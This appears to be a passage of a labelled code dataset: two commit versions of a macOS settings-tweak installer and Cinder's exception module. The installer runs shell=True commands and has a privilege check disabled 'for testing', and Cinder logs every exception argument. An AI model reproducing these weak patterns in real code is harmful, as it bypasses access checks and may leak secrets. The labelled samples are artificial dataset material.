        dglogger.log_error(e, file=sys.stderr)
    except KeyError as e:
        dglogger.log_error(e, file=sys.stderr)
    except TypeError as e:
        dglogger.log_error(e)

def run_interactive_mode():
    print(""Interactive not implemented"")


def run_list_mode(indent = '    '):
    """"""helper function to print summary info from the tweaks list.

    :global arg.list: replies on global results from parser.
    :param indent: number of spaces to indent. Defaults to 4.
    :return:
    """"""
    print(""--list: "" + str(args.list))

    if args.list == 'a' or args.list == 'all' or args.list == 'g' or args.list == 'groups':
        grp = set()
        for s in tweaks.tweaks:
            grp.add(s['group'])

        print('The groups are:')
        for t in sorted(grp):
            print(indent + t)

    if args.list == 'a' or args.list == 'all' or args.list == 'd' or args.list == 'descriptions':
        descriptions = set()
        for d in tweaks.tweaks:
            descriptions.add(d['group'] + ' | ' + d['description'])

        print('group | description:')
        for t in sorted(descriptions):
            print(indent + t)


def main():
    log_file = dglogger.log_config()

    dglogger.log_start()

    parser = argparse.ArgumentParser(
        description=""""""install_mac_tweaks changes user and global settings to improve performance, security, 
    and convenience. Results logged to a file.""""""
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument(""--mode"", choices=['b', 'batch', 'i', 'interactive'],
                   action = 'store', default = 'batch',
                   help='Run interactively to confirm each change.')
    group.add_argument('--list', choices = ['all', 'a', 'groups', 'g', 'descriptions', 'd'],
                   action = 'store',
                   help='Print lists of the groups and set commands. Silently ignores --groups.')
    parser.add_argument('--groups', type = str, nargs='+',
                    help='Select a subset of tweaks to execute')
    args = parser.parse_args()

    try:
        import tweaks
    except ImportError as e:
        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_end(log_file)
        sys.exit(1)

    if args.list is not None:
        run_list_mode()
        sys.exit(0)
    elif args.mode == 'batch' or args.mode == 'b':
        run_batch_mode(tweaks.tweaks, args)
    elif args.mode == 'interactive' or args.mode == 'i':
        run_interactive_mode()

    dglogger.log_end(log_file)


if __name__ == '__main__':
    main()
else:
    print(""WARNING: Was not expecting to be imported. Exiting."")

# regex to replace i and b for mode - code or argsparse fiddling - probably can do in argparse
# pswd = getpass.getpass()
# getpass.getuser() for user name - check this code, installer.py & dot-profile, rpr-3-sort-a-diofile.site, home-profile
# # Sorting dictionaries: https://stackoverflow.com/questions/20944483/pythonct-by-its-values/20948781?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
# Sorting dictionaries: https://www.pythoncentral.io/how-to-sort-python-dictionaries-by-key-or-value/
# Asking for a password: https://askubuntu.com/questions/155791/how-do-i-sudo-a-command-in-a-script-without-being-asked-for-a-password
# --list output to less or more for pagination
/n/n/nos-x-config/standard_tweaks/tweaks.py/n/n#! /usr/bin/env python3
#  -*- coding: utf-8 -*-

# Definition of OS X/MacOS tweaks
# group, description, set, get, os_v_min, os_ver_max

tweaks = [
    {'group': 'test',
     'description': 'Test exception handling',
     'get': ""foobar"",
     'set': ""set-foobar"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening and closing windows.',
     'get': ""defaults read NSGlobalDomain NSAutomaticWindowAnimationsEnabled"",
     'set': ""defaults write NSGlobalDomain NSAutomaticWindowAnimationsEnabled -bool false"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening a Quick Look window.',
     'set': ""defaults write -g QLPanelAnimationDuration -float 0"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animation when opening the Info window in OS X Finder (cmd⌘ + i).',
     'set': 'defaults write com.apple.finder DisableAllAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Accelerated playback when adjusting the window size (Cocoa applications).',
     'set': 'defaults write NSGlobalDomain NSWindowResizeTime -float 0.001',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when you open an application from the Dock.',
     'set': 'defaults write com.apple.dock launchanim -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Always show the full URL in the search/url field',
     'get': 'defaults read com.apple.Safari ShowFullURLInSmartSearchField',
     'set': 'defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'admin',
     'description': 'Show Recovery partition & EFI Boot partition',
     'set': 'defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true',
     'os_v_min': '10.09', 'os_v_max': '10.10'
     },
    {'group': 'general',
     'description': 'Disable shadow in screenshots',
     'set': 'defaults write com.apple.screencapture disable-shadow -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable Bonjour multicast advertisements.\n  See https://www.trustwave.com/Resources/SpiderLabs-Blog/mDNS---Telling-the-world-about-you-(and-your-device)/',
     'get': 'defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',
     'set': 'sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable WiFi hotspot screen',
     'get': 'defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',
     'set': 'sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -boolean false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Don’t show Dashboard as a Space',
     'get': 'defaults read com.apple.dock dashboard-in-overlay',
     'set': 'defaults write com.apple.dock dashboard-in-overlay -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Show file path in title of finder window',
     'set': 'defaults write com.apple.finder _FXShowPosixPathInTitle -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Enable AirDrop feature for ethernet connected Macs',
     'set': 'defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Always show scroll bars',
     'set': 'defaults write NSGlobalDomain AppleShowScrollBars -string ""Always""',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Expand Save panel by default (1/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Expand Save panel by default (2/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general', 'description': 'Expand Print menu by default (1/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general', 'description': 'Expand Print menu by default (2/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Make all animations faster that are used by Mission Control.',
     'set': 'defaults write com.apple.dock expose-animation-duration -float 0.1',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the delay when you hide the Dock',
     'set': 'defaults write com.apple.Dock autohide-delay -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Remove the animation when hiding/showing the Dock',
     'set': 'defaults write com.apple.dock autohide-time-modifier -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the animation when you replying to an e-mail',
     'set': 'defaults write com.apple.mail DisableReplyAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Disable the animation when you sending an e-mail',
     'set': 'defaults write com.apple.mail DisableSendAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the standard delay in rendering a Web page.',
     'set': 'defaults write com.apple.Safari WebKitInitialTimedLayoutDelay 0.25',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'The keyboard react faster to keystrokes (not equally useful for everyone)',
     'set': 'defaults write NSGlobalDomain KeyRepeat -int 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Disable smooth scrolling for paging (space bar)',
     'set': 'defaults write -g NSScrollAnimationEnabled -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on network volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on USB volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Show the ~/Library folder',
     'set': 'chflags nohidden ~/Library',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Save to disk (not to iCloud) by default',
     'set': 'defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the warning when changing a file extension',
     'set': 'defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     }
]
/n/n/n",0
25,25,bb2ded2dbbbac8966a77cc8aa227011a8b8772c0,"/os-x-config/standard_tweaks/install_mac_tweaks.py/n/n#! /usr/bin/env python3
""""""
Set user settings to optimize performance, Finder and windowing features, and automate standard preference
settings.

While this is an Apple specific script, it doesn't check to see if it's executing on a Mac.
""""""

import dglogger
import argparse
import os
import getpass
import grp
import platform
import re
import pexpect
import shlex
import subprocess
import sys


def is_admin():
    """"""Check to see if the user belongs to the 'admin' group.

    :return: boolean
    """"""
    return os.getlogin() in grp.getgrnam('admin').gr_mem


def is_executable(tweak_group, groups, is_admin = is_admin()):
    """"""Determines if the tweak should be executed.

    :param tweak_group: tweak's group key value.
    :param groups: groups specified on the command line.
    :param is_admin: True if user belongs to 'admn' group.
    :rtype: boolean
    """"""
    return True # for testing
    if groups is None and tweak_group != 'sudo':
        return True
    if groups is None and tweak_group == 'sudo' and is_admin:
        return True
    if groups is not None and tweak_group in groups and tweak_group != 'sudo':
        return True
    if groups is not None and tweak_group in groups and tweak_group == 'sudo' and is_admin:
        return True
    return False


def os_supported(min_v, max_v):
    """"""Checks to see if the preference is supported on your version of the Mac OS.
    NB: 10.9 is represented in the tweaks.py file as 10.09.

    :param min_v:
    :param max_v:
    :return: boolean
    """"""
    os_version = re.match('[0-9]+\.[0-9]+', platform.mac_ver()[0]).group(0)  # major.minor
    return not (os_version < str(min_v) or (max_v is not None and os_version > str(max_v)))


def run_batch_mode(tweaks, args):
    for t in tweaks:
        if os_supported(t['os_v_min'], t['os_v_max']) \
                and is_executable(t['group'], args.groups, is_admin()) \
                and t['group'] != 'test':
            run_command(t['set'])


def run_command(cmd):
    try:
        subprocess.run(cmd, shell=True, timeout=60, check=True)
        dglogger.log_info(str(cmd))
    except subprocess.CalledProcessError as e:
#        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_error(str(e)) # figure out deal w/file=sys.stderr!
    except subprocess.TimeoutExpired as e:
        dglogger.log_error(e, file=sys.stderr)
    except OSError as e:
        dglogger.log_error(e, file=sys.stderr)
    except KeyError as e:
        dglogger.log_error(e, file=sys.stderr)
    except TypeError as e:
        dglogger.log_error(e)

def run_interactive_mode():
    print(""Interactive not implemented"")


def run_list_mode(indent = '    '):
    """"""helper function to print summary info from the tweaks list.

    :global arg.list: replies on global results from parser.
    :param indent: number of spaces to indent. Defaults to 4.
    :return:
    """"""
    print(""--list: "" + str(args.list))

    if args.list == 'a' or args.list == 'all' or args.list == 'g' or args.list == 'groups':
        grp = set()
        for s in tweaks.tweaks:
            grp.add(s['group'])

        print('The groups are:')
        for t in sorted(grp):
            print(indent + t)

    if args.list == 'a' or args.list == 'all' or args.list == 'd' or args.list == 'descriptions':
        descriptions = set()
        for d in tweaks.tweaks:
            descriptions.add(d['group'] + ' | ' + d['description'])

        print('group | description:')
        for t in sorted(descriptions):
            print(indent + t)


def main():
    log_file = dglogger.log_config()

    dglogger.log_start()

    parser = argparse.ArgumentParser(
        description=""""""install_mac_tweaks changes user and global settings to improve performance, security, 
    and convenience. Results logged to a file.""""""
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument(""--mode"", choices=['b', 'batch', 'i', 'interactive'],
                   action = 'store', default = 'batch',
                   help='Run interactively to confirm each change.')
    group.add_argument('--list', choices = ['all', 'a', 'groups', 'g', 'descriptions', 'd'],
                   action = 'store',
                   help='Print lists of the groups and set commands. Silently ignores --groups.')
    parser.add_argument('--groups', type = str, nargs='+',
                    help='Select a subset of tweaks to execute')
    args = parser.parse_args()

    try:
        import tweaks
    except ImportError as e:
        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_end(log_file)
        sys.exit(1)

    if args.list is not None:
        run_list_mode()
        sys.exit(0)
    elif args.mode == 'batch' or args.mode == 'b':
        run_batch_mode(tweaks.tweaks, args)
    elif args.mode == 'interactive' or args.mode == 'i':
        run_interactive_mode()

    dglogger.log_end(log_file)


if __name__ == '__main__':
    main()
else:
    print(""WARNING: Was not expecting to be imported. Exiting."")

# regex to replace i and b for mode - code or argsparse fiddling - probably can do in argparse
# pswd = getpass.getpass()
# getpass.getuser() for user name - check this code, installer.py & dot-profile, rpr-3-sort-a-diofile.site, home-profile
# # Sorting dictionaries: https://stackoverflow.com/questions/20944483/pythonct-by-its-values/20948781?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
# Sorting dictionaries: https://www.pythoncentral.io/how-to-sort-python-dictionaries-by-key-or-value/
# Asking for a password: https://askubuntu.com/questions/155791/how-do-i-sudo-a-command-in-a-script-without-being-asked-for-a-password
# Add shlex parsing for safe passing of parameters
# --list output to less or more for pagination
/n/n/n/os-x-config/standard_tweaks/tweaks.py/n/n#! /usr/bin/env python3
#  -*- coding: utf-8 -*-

# Definition of OS X/MacOS tweaks
# group, description, set, get, os_v_min, os_ver_max

tweaks = [
    {'group': 'test',
     'description': 'Test exception handling',
     'get': ""foobar"",
     'set': ""set-foobar"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening and closing windows.',
     'get': ""defaults read NSGlobalDomain NSAutomaticWindowAnimationsEnabled"",
     'set': ""defaults write NSGlobalDomain NSAutomaticWindowAnimationsEnabled -bool false"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening a Quick Look window.',
     'set': ""defaults write -g QLPanelAnimationDuration -float 0"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animation when opening the Info window in OS X Finder (cmd⌘ + i).',
     'set': 'defaults write com.apple.finder DisableAllAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Accelerated playback when adjusting the window size (Cocoa applications).',
     'set': 'defaults write NSGlobalDomain NSWindowResizeTime -float 0.001',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when you open an application from the Dock.',
     'set': 'defaults write com.apple.dock launchanim -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Always show the full URL in the search/url field',
     'get': 'defaults read com.apple.Safari ShowFullURLInSmartSearchField',
     'set': 'defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'admin',
     'description': 'Show Recovery partition & EFI Boot partition',
     'set': 'defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true',
     'os_v_min': '10.09', 'os_v_max': '10.10'
     },
    {'group': 'general',
     'description': 'Disable shadow in screenshots',
     'set': 'defaults write com.apple.screencapture disable-shadow -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable Bonjour multicast advertisements.\n  See https://www.trustwave.com/Resources/SpiderLabs-Blog/mDNS---Telling-the-world-about-you-(and-your-device)/',
     'get': 'sudo defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',
     'set': 'sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable WiFi hotspot screen',
     'get': 'sudo defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',
     'set': 'sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -boolean false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Don’t show Dashboard as a Space',
     'get': 'defaults read com.apple.dock dashboard-in-overlay',
     'set': 'defaults write com.apple.dock dashboard-in-overlay -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Show file path in title of finder window',
     'set': 'defaults write com.apple.finder _FXShowPosixPathInTitle -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Enable AirDrop feature for ethernet connected Macs',
     'set': 'defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Always show scroll bars',
     'set': 'defaults write NSGlobalDomain AppleShowScrollBars -string ""Always""',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Expand Save panel by default (1/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Expand Save panel by default (2/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general', 'description': 'Expand Print menu by default (1/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general', 'description': 'Expand Print menu by default (2/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Make all animations faster that are used by Mission Control.',
     'set': 'defaults write com.apple.dock expose-animation-duration -float 0.1',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the delay when you hide the Dock',
     'set': 'defaults write com.apple.Dock autohide-delay -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Remove the animation when hiding/showing the Dock',
     'set': 'defaults write com.apple.dock autohide-time-modifier -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the animation when you replying to an e-mail',
     'set': 'defaults write com.apple.mail DisableReplyAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Disable the animation when you sending an e-mail',
     'set': 'defaults write com.apple.mail DisableSendAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the standard delay in rendering a Web page.',
     'set': 'defaults write com.apple.Safari WebKitInitialTimedLayoutDelay 0.25',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'The keyboard react faster to keystrokes (not equally useful for everyone)',
     'set': 'defaults write NSGlobalDomain KeyRepeat -int 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Disable smooth scrolling for paging (space bar)',
     'set': 'defaults write -g NSScrollAnimationEnabled -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on network volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on USB volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Show the ~/Library folder',
     'set': 'chflags nohidden ~/Library',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Save to disk (not to iCloud) by default',
     'set': 'defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the warning when changing a file extension',
     'set': 'defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     }
]
/n/n/n",1
74,74,f752302d181583a95cf44354aea607ce9d9283f4,"cinder/exception.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2010 United States Government as represented by the
# Administrator of the National Aeronautics and Space Administration.
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

""""""Cinder base exception handling.

Includes decorator for re-raising Cinder-type exceptions.

SHOULD include dedicated exception logging.

""""""

import sys

from oslo.config import cfg
import webob.exc

from cinder.openstack.common import exception as com_exception
from cinder.openstack.common import log as logging


LOG = logging.getLogger(__name__)

exc_log_opts = [
    cfg.BoolOpt('fatal_exception_format_errors',
                default=False,
                help='make exception message format errors fatal'),
]

CONF = cfg.CONF
CONF.register_opts(exc_log_opts)


class ConvertedException(webob.exc.WSGIHTTPException):
    def __init__(self, code=0, title="""", explanation=""""):
        self.code = code
        self.title = title
        self.explanation = explanation
        super(ConvertedException, self).__init__()


class ProcessExecutionError(IOError):
    def __init__(self, stdout=None, stderr=None, exit_code=None, cmd=None,
                 description=None):
        self.exit_code = exit_code
        self.stderr = stderr
        self.stdout = stdout
        self.cmd = cmd
        self.description = description

        if description is None:
            description = _('Unexpected error while running command.')
        if exit_code is None:
            exit_code = '-'
        message = _('%(description)s\nCommand: %(cmd)s\n'
                    'Exit code: %(exit_code)s\nStdout: %(stdout)r\n'
                    'Stderr: %(stderr)r') % {
                        'description': description,
                        'cmd': cmd,
                        'exit_code': exit_code,
                        'stdout': stdout,
                        'stderr': stderr,
                    }
        IOError.__init__(self, message)


Error = com_exception.Error


class CinderException(Exception):
    """"""Base Cinder Exception

    To correctly use this class, inherit from it and define
    a 'message' property. That message will get printf'd
    with the keyword arguments provided to the constructor.

    """"""
    message = _(""An unknown exception occurred."")
    code = 500
    headers = {}
    safe = False

    def __init__(self, message=None, **kwargs):
        self.kwargs = kwargs

        if 'code' not in self.kwargs:
            try:
                self.kwargs['code'] = self.code
            except AttributeError:
                pass

        if not message:
            try:
                message = self.message % kwargs

            except Exception:
                exc_info = sys.exc_info()
                # kwargs doesn't match a variable in the message
                # log the issue and the kwargs
                LOG.exception(_('Exception in string format operation'))
                for name, value in kwargs.iteritems():
                    LOG.error(""%s: %s"" % (name, value))
                if CONF.fatal_exception_format_errors:
                    raise exc_info[0], exc_info[1], exc_info[2]
                # at least get the core message out if something happened
                message = self.message

        super(CinderException, self).__init__(message)


class GlanceConnectionFailed(CinderException):
    message = _(""Connection to glance failed"") + "": %(reason)s""


class NotAuthorized(CinderException):
    message = _(""Not authorized."")
    code = 403


class AdminRequired(NotAuthorized):
    message = _(""User does not have admin privileges"")


class PolicyNotAuthorized(NotAuthorized):
    message = _(""Policy doesn't allow %(action)s to be performed."")


class ImageNotAuthorized(CinderException):
    message = _(""Not authorized for image %(image_id)s."")


class Invalid(CinderException):
    message = _(""Unacceptable parameters."")
    code = 400


class InvalidSnapshot(Invalid):
    message = _(""Invalid snapshot"") + "": %(reason)s""


class InvalidSourceVolume(Invalid):
    message = _(""Invalid source volume %(reason)s."")


class VolumeAttached(Invalid):
    message = _(""Volume %(volume_id)s is still attached, detach volume first."")


class SfJsonEncodeFailure(CinderException):
    message = _(""Failed to load data into json format"")


class InvalidRequest(Invalid):
    message = _(""The request is invalid."")


class InvalidResults(Invalid):
    message = _(""The results are invalid."")


class InvalidInput(Invalid):
    message = _(""Invalid input received"") + "": %(reason)s""


class InvalidVolumeType(Invalid):
    message = _(""Invalid volume type"") + "": %(reason)s""


class InvalidVolume(Invalid):
    message = _(""Invalid volume"") + "": %(reason)s""


class InvalidContentType(Invalid):
    message = _(""Invalid content type %(content_type)s."")


class InvalidHost(Invalid):
    message = _(""Invalid host"") + "": %(reason)s""


# Cannot be templated as the error syntax varies.
# msg needs to be constructed when raised.
class InvalidParameterValue(Invalid):
    message = _(""%(err)s"")


class InvalidAuthKey(Invalid):
    message = _(""Invalid auth key"") + "": %(reason)s""


class ServiceUnavailable(Invalid):
    message = _(""Service is unavailable at this time."")


class ImageUnacceptable(Invalid):
    message = _(""Image %(image_id)s is unacceptable: %(reason)s"")


class DeviceUnavailable(Invalid):
    message = _(""The device in the path %(path)s is unavailable: %(reason)s"")


class InvalidUUID(Invalid):
    message = _(""Expected a uuid but received %(uuid)s."")


class NotFound(CinderException):
    message = _(""Resource could not be found."")
    code = 404
    safe = True


class PersistentVolumeFileNotFound(NotFound):
    message = _(""Volume %(volume_id)s persistence file could not be found."")


class VolumeNotFound(NotFound):
    message = _(""Volume %(volume_id)s could not be found."")


class SfAccountNotFound(NotFound):
    message = _(""Unable to locate account %(account_name)s on ""
                ""Solidfire device"")


class VolumeNotFoundForInstance(VolumeNotFound):
    message = _(""Volume not found for instance %(instance_id)s."")


class VolumeMetadataNotFound(NotFound):
    message = _(""Volume %(volume_id)s has no metadata with ""
                ""key %(metadata_key)s."")


class InvalidVolumeMetadata(Invalid):
    message = _(""Invalid metadata"") + "": %(reason)s""


class InvalidVolumeMetadataSize(Invalid):
    message = _(""Invalid metadata size"") + "": %(reason)s""


class SnapshotMetadataNotFound(NotFound):
    message = _(""Snapshot %(snapshot_id)s has no metadata with ""
                ""key %(metadata_key)s."")


class InvalidSnapshotMetadata(Invalid):
    message = _(""Invalid metadata"") + "": %(reason)s""


class InvalidSnapshotMetadataSize(Invalid):
    message = _(""Invalid metadata size"") + "": %(reason)s""


class VolumeTypeNotFound(NotFound):
    message = _(""Volume type %(volume_type_id)s could not be found."")


class VolumeTypeNotFoundByName(VolumeTypeNotFound):
    message = _(""Volume type with name %(volume_type_name)s ""
                ""could not be found."")


class VolumeTypeExtraSpecsNotFound(NotFound):
    message = _(""Volume Type %(volume_type_id)s has no extra specs with ""
                ""key %(extra_specs_key)s."")


class SnapshotNotFound(NotFound):
    message = _(""Snapshot %(snapshot_id)s could not be found."")


class VolumeIsBusy(CinderException):
    message = _(""deleting volume %(volume_name)s that has snapshot"")


class SnapshotIsBusy(CinderException):
    message = _(""deleting snapshot %(snapshot_name)s that has ""
                ""dependent volumes"")


class ISCSITargetNotFoundForVolume(NotFound):
    message = _(""No target id found for volume %(volume_id)s."")


class ISCSITargetCreateFailed(CinderException):
    message = _(""Failed to create iscsi target for volume %(volume_id)s."")


class ISCSITargetAttachFailed(CinderException):
    message = _(""Failed to attach iSCSI target for volume %(volume_id)s."")


class ISCSITargetRemoveFailed(CinderException):
    message = _(""Failed to remove iscsi target for volume %(volume_id)s."")


class DiskNotFound(NotFound):
    message = _(""No disk at %(location)s"")


class InvalidImageRef(Invalid):
    message = _(""Invalid image href %(image_href)s."")


class ImageNotFound(NotFound):
    message = _(""Image %(image_id)s could not be found."")


class ServiceNotFound(NotFound):
    message = _(""Service %(service_id)s could not be found."")


class HostNotFound(NotFound):
    message = _(""Host %(host)s could not be found."")


class SchedulerHostFilterNotFound(NotFound):
    message = _(""Scheduler Host Filter %(filter_name)s could not be found."")


class SchedulerHostWeigherNotFound(NotFound):
    message = _(""Scheduler Host Weigher %(weigher_name)s could not be found."")


class HostBinaryNotFound(NotFound):
    message = _(""Could not find binary %(binary)s on host %(host)s."")


class InvalidReservationExpiration(Invalid):
    message = _(""Invalid reservation expiration %(expire)s."")


class InvalidQuotaValue(Invalid):
    message = _(""Change would make usage less than 0 for the following ""
                ""resources: %(unders)s"")


class QuotaNotFound(NotFound):
    message = _(""Quota could not be found"")


class QuotaResourceUnknown(QuotaNotFound):
    message = _(""Unknown quota resources %(unknown)s."")


class ProjectQuotaNotFound(QuotaNotFound):
    message = _(""Quota for project %(project_id)s could not be found."")


class QuotaClassNotFound(QuotaNotFound):
    message = _(""Quota class %(class_name)s could not be found."")


class QuotaUsageNotFound(QuotaNotFound):
    message = _(""Quota usage for project %(project_id)s could not be found."")


class ReservationNotFound(QuotaNotFound):
    message = _(""Quota reservation %(uuid)s could not be found."")


class OverQuota(CinderException):
    message = _(""Quota exceeded for resources: %(overs)s"")


class MigrationNotFound(NotFound):
    message = _(""Migration %(migration_id)s could not be found."")


class MigrationNotFoundByStatus(MigrationNotFound):
    message = _(""Migration not found for instance %(instance_id)s ""
                ""with status %(status)s."")


class FileNotFound(NotFound):
    message = _(""File %(file_path)s could not be found."")


class ClassNotFound(NotFound):
    message = _(""Class %(class_name)s could not be found: %(exception)s"")


class NotAllowed(CinderException):
    message = _(""Action not allowed."")


#TODO(bcwaldon): EOL this exception!
class Duplicate(CinderException):
    pass


